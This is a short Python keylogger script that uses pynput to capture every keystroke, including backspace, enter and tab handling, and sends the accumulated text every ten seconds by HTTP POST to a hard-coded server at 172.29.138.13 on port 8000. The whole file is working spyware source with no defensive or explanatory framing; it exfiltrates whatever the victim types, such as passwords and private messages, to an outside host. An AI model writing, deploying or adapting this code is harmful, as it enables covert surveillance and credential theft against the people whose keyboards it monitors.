from pynput import keyboard
import requests
import json
import threading

# Global variable for keystrokes
text = ""

# Server details
ip_address = "172.29.138.13"
port_number = "8000"
time_interval = 10

def send_post_req():
    global text
    try:
        if text:  # Only send if there's text to send
            payload = json.dumps({"keyboardData": text})
            r = requests.post(
                f"http://{ip_address}:{port_number}",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            # print(f"Sent data: {text}")  # Log what's being sent
            # text = ""  # Clear text after sending
        else:
            print("No data to send")  # Log when there's no data

        # Start the timer thread again
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

def on_press(key):
    global text
    try:
        # Log special keys appropriately and append to text
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif hasattr(key, 'char'):  # Check if the key has a character
            text += key.char
        print(f"Current text: {text}")  # Debug: print current text
    except AttributeError:
        # Handle special keys that do not have a `char` attribute (e.g., function keys)
        pass

# Start the keylogger and the initial post request
with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
